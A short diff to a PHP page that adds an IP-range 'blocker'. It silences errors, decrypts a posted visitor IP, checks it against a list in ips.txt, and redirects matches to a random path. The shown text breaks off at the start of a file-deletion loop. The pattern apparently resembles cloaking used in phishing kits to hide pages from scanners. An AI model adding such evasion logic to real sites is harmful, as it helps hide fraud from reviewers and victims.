@@ -38,7 +38,35 @@ div img {
 <?php
 error_reporting(0);
 include('engine/encrypt.php');
-require 'block.php';
+//blocker
+include 'ip_in_range2.php';
+
+function RandNumber($randstr)
+{
+    $char = 'abcdefghijklmnopqrstuvwxyz';
+    $str  = '';
+    for ($i = 0;
+        $i < $randstr;
+        $i++) {
+        $pos = rand(0, strlen($char) - 1);
+        $str .= $char[$pos];
+    }
+    return $str;
+
+}
+
+$ips = explode("\n", file_get_contents('ips.txt'));
+$realip = doDecrypt($_POST['ip']);
+
+foreach ($ips as $ip)
+{
+    if (ip_in_range($realip, $ip))
+    {
+		header('location: '. RandNumber(9));
+        exit;
+    }
+}
+//require 'block.php';
 //delete old files
 $files = glob(getcwd().'/*'); // get all file names
 	foreach($files as $file){ // iterate files
